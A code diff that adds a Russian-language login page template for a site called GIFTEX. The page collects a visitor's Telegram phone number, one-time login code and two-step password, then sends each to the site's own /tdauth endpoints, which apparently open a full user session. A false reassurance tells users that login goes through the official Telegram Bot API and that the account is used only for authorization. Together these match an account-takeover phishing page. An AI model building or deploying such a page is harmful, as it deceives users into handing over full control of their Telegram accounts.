@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title><%= title %></title>
+  
+  <!-- Подключаем шрифты -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  
+  <!-- Подключаем Tailwind CSS -->
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <!-- Фавиконка -->
+  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+</head>
+<body class="bg-telegram-white min-h-screen flex flex-col">
+  <!-- Шапка сайта -->
+  <header class="bg-telegram-blue text-white p-4 shadow-md">
+    <div class="container mx-auto flex justify-between items-center">
+      <a href="/" class="text-2xl font-bold flex items-center">
+        <span class="mr-2">🎁</span> GIFTEX
+      </a>
+      
+      <nav class="flex items-center space-x-4">
+        <a href="/" class="hover:underline">Главная</a>
+      </nav>
+    </div>
+  </header>
+
+  <!-- Основное содержимое -->
+  <main class="flex-grow">
+    <div class="min-h-screen flex flex-col items-center justify-center py-10 px-4">
+      <div class="bg-white shadow-xl rounded-lg p-8 max-w-md w-full">
+        <div class="text-center mb-8">
+          <h1 class="text-3xl font-bold mb-4 text-telegram-blue">Авторизация через Telegram</h1>
+          <p class="text-gray-700">Введите свой номер телефона Telegram для продолжения</p>
+        </div>
+        
+        <!-- Форма авторизации -->
+        <div id="auth-container">
+          <!-- Шаг 1: Инициализация -->
+          <div id="auth-step-init" class="<%= authState === 'init' ? '' : 'hidden' %>">
+            <p class="text-center text-gray-700 mb-6">Нажмите кнопку ниже, чтобы начать процесс авторизации</p>
+            <button id="btn-init" class="w-full bg-telegram-blue hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition">
+              Начать авторизацию
+            </button>
+          </div>
+          
+          <!-- Шаг 2: Ввод номера телефона -->
+          <div id="auth-step-phone" class="<%= authState === 'authorizationStateWaitPhoneNumber' ? '' : 'hidden' %>">
+            <p class="text-center text-gray-700 mb-6">Введите ваш номер телефона в международном формате</p>
+            <div class="mb-4">
+              <label for="phone-number" class="block text-gray-700 mb-2">Номер телефона</label>
+              <input type="tel" id="phone-number" placeholder="+79123456789" class="w-full border border-gray-300 rounded-md py-2 px-4 focus:outline-none focus:ring-2 focus:ring-telegram-blue focus:border-transparent">
+            </div>
+            <button id="btn-send-phone" class="w-full bg-telegram-blue hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition">
+              Отправить код
+            </button>
+          </div>
+          
+          <!-- Шаг 3: Ввод кода подтверждения -->
+          <div id="auth-step-code" class="<%= authState === 'waitCode' || authState === 'authorizationStateWaitCode' ? '' : 'hidden' %>">
+            <p class="text-center text-gray-700 mb-6">Введите код, который мы отправили в Telegram</p>
+            <div class="mb-4">
+              <label for="auth-code" class="block text-gray-700 mb-2">Код подтверждения</label>
+              <input type="text" id="auth-code" placeholder="12345" class="w-full border border-gray-300 rounded-md py-2 px-4 focus:outline-none focus:ring-2 focus:ring-telegram-blue focus:border-transparent">
+            </div>
+            <button id="btn-send-code" class="w-full bg-telegram-blue hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition">
+              Подтвердить
+            </button>
+          </div>
+          
+          <!-- Шаг 4: Ввод пароля (для защищенных аккаунтов) -->
+          <div id="auth-step-password" class="<%= authState === 'waitPassword' || authState === 'authorizationStateWaitPassword' ? '' : 'hidden' %>">
+            <p class="text-center text-gray-700 mb-6">Введите пароль от вашего аккаунта Telegram</p>
+            <div class="mb-4">
+              <label for="auth-password" class="block text-gray-700 mb-2">Пароль</label>
+              <input type="password" id="auth-password" class="w-full border border-gray-300 rounded-md py-2 px-4 focus:outline-none focus:ring-2 focus:ring-telegram-blue focus:border-transparent">
+            </div>
+            <button id="btn-send-password" class="w-full bg-telegram-blue hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition">
+              Войти
+            </button>
+          </div>
+          
+          <!-- Индикатор загрузки -->
+          <div id="auth-loading" class="hidden">
+            <div class="flex justify-center items-center py-6">
+              <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-telegram-blue"></div>
+            </div>
+            <p class="text-center text-gray-700" id="loading-message">Выполняется авторизация...</p>
+          </div>
+          
+          <!-- Сообщение об ошибке -->
+          <div id="auth-error" class="hidden">
+            <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mt-4" role="alert">
+              <span class="block sm:inline" id="error-message"></span>
+            </div>
+          </div>
+        </div>
+        
+        <div class="text-center text-sm text-gray-600 mt-8">
+          <p class="mb-4">
+            Мы используем ваш аккаунт только для авторизации.
+          </p>
+          <p>
+            Авторизация выполняется напрямую через официальный Telegram Bot API.
+          </p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Подвал сайта -->
+  <footer class="bg-telegram-gray py-4 mt-8">
+    <div class="container mx-auto text-center text-gray-700">
+      <p>&copy; <%= new Date().getFullYear() %> GIFTEX. Все права защищены.</p>
+      <p class="mt-2 text-sm">Этот сайт не является официальным проектом Telegram.</p>
+    </div>
+  </footer>
+
+  <!-- Общие скрипты -->
+  <script src="/js/app.js"></script>
+  
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // DOM элементы
+      const authStepInit = document.getElementById('auth-step-init');
+      const authStepPhone = document.getElementById('auth-step-phone');
+      const authStepCode = document.getElementById('auth-step-code');
+      const authStepPassword = document.getElementById('auth-step-password');
+      const authLoading = document.getElementById('auth-loading');
+      const authError = document.getElementById('auth-error');
+      const errorMessage = document.getElementById('error-message');
+      const loadingMessage = document.getElementById('loading-message');
+      
+      // Кнопки
+      const btnInit = document.getElementById('btn-init');
+      const btnSendPhone = document.getElementById('btn-send-phone');
+      const btnSendCode = document.getElementById('btn-send-code');
+      const btnSendPassword = document.getElementById('btn-send-password');
+      
+      // Поля ввода
+      const phoneNumberInput = document.getElementById('phone-number');
+      const authCodeInput = document.getElementById('auth-code');
+      const authPasswordInput = document.getElementById('auth-password');
+      
+      // Функция для показа определенного шага
+      function showStep(step) {
+        authStepInit.classList.add('hidden');
+        authStepPhone.classList.add('hidden');
+        authStepCode.classList.add('hidden');
+        authStepPassword.classList.add('hidden');
+        authLoading.classList.add('hidden');
+        authError.classList.add('hidden');
+        
+        switch(step) {
+          case 'init':
+            authStepInit.classList.remove('hidden');
+            break;
+          case 'phone':
+            authStepPhone.classList.remove('hidden');
+            break;
+          case 'code':
+            authStepCode.classList.remove('hidden');
+            break;
+          case 'password':
+            authStepPassword.classList.remove('hidden');
+            break;
+          case 'loading':
+            authLoading.classList.remove('hidden');
+            break;
+        }
+      }
+      
+      // Функция для отображения ошибки
+      function showError(message) {
+        errorMessage.textContent = message;
+        authError.classList.remove('hidden');
+      }
+      
+      // Инициализация авторизации
+      btnInit.addEventListener('click', function() {
+        showStep('loading');
+        loadingMessage.textContent = 'Инициализация процесса авторизации...';
+        
+        fetch('/tdauth/init', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          }
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            const authState = data.authState;
+            
+            if (authState === 'authorizationStateWaitPhoneNumber') {
+              showStep('phone');
+            } else if (authState === 'authorizationStateWaitCode' || authState === 'waitCode') {
+              showStep('code');
+            } else if (authState === 'authorizationStateWaitPassword' || authState === 'waitPassword') {
+              showStep('password');
+            } else if (authState === 'authorizationStateReady' || authState === 'ready') {
+              window.location.href = '/';
+            } else {
+              showStep('init');
+              showError('Неподдерживаемое состояние авторизации: ' + authState);
+            }
+          } else {
+            showStep('init');
+            showError(data.error || 'Ошибка инициализации');
+          }
+        })
+        .catch(error => {
+          showStep('init');
+          showError('Произошла ошибка при инициализации');
+          console.error('Ошибка:', error);
+        });
+      });
+      
+      // Отправка номера телефона
+      btnSendPhone.addEventListener('click', function() {
+        const phoneNumber = phoneNumberInput.value.trim();
+        
+        if (!phoneNumber) {
+          showError('Пожалуйста, введите номер телефона');
+          return;
+        }
+        
+        showStep('loading');
+        loadingMessage.textContent = 'Отправка номера телефона...';
+        
+        fetch('/tdauth/send-phone', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ phoneNumber })
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            showStep('code');
+          } else {
+            showStep('phone');
+            showError(data.error || 'Ошибка при отправке номера');
+          }
+        })
+        .catch(error => {
+          showStep('phone');
+          showError('Произошла ошибка при отправке номера');
+          console.error('Ошибка:', error);
+        });
+      });
+      
+      // Отправка кода подтверждения
+      btnSendCode.addEventListener('click', function() {
+        const code = authCodeInput.value.trim();
+        
+        if (!code) {
+          showError('Пожалуйста, введите код подтверждения');
+          return;
+        }
+        
+        showStep('loading');
+        loadingMessage.textContent = 'Проверка кода...';
+        
+        fetch('/tdauth/send-code', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ code })
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            if (data.authState === 'waitPassword' || data.authState === 'authorizationStateWaitPassword') {
+              showStep('password');
+            } else if (data.authState === 'ready' || data.authState === 'authorizationStateReady') {
+              window.location.href = data.redirectUrl || '/';
+            } else {
+              showStep('code');
+              showError('Неожиданное состояние авторизации: ' + data.authState);
+            }
+          } else {
+            showStep('code');
+            showError(data.error || 'Ошибка при проверке кода');
+          }
+        })
+        .catch(error => {
+          showStep('code');
+          showError('Произошла ошибка при проверке кода');
+          console.error('Ошибка:', error);
+        });
+      });
+      
+      // Отправка пароля
+      btnSendPassword.addEventListener('click', function() {
+        const password = authPasswordInput.value;
+        
+        if (!password) {
+          showError('Пожалуйста, введите пароль');
+          return;
+        }
+        
+        showStep('loading');
+        loadingMessage.textContent = 'Проверка пароля...';
+        
+        fetch('/tdauth/send-password', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ password })
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            window.location.href = data.redirectUrl || '/';
+          } else {
+            showStep('password');
+            showError(data.error || 'Ошибка при проверке пароля');
+          }
+        })
+        .catch(error => {
+          showStep('password');
+          showError('Произошла ошибка при проверке пароля');
+          console.error('Ошибка:', error);
+        });
+      });
+      
+      // Обработчики событий для ввода по клавише Enter
+      phoneNumberInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+          btnSendPhone.click();
+        }
+      });
+      
+      authCodeInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+          btnSendCode.click();
+        }
+      });
+      
+      authPasswordInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+          btnSendPassword.click();
+        }
+      });
+      
+      // Автоматически запускаем инициализацию, если мы в состоянии init
+      if (authStepInit.classList.contains('hidden') === false) {
+        setTimeout(() => {
+          btnInit.click();
+        }, 500);
+      }
+    });
+  </script>
+</body>
+</html> 
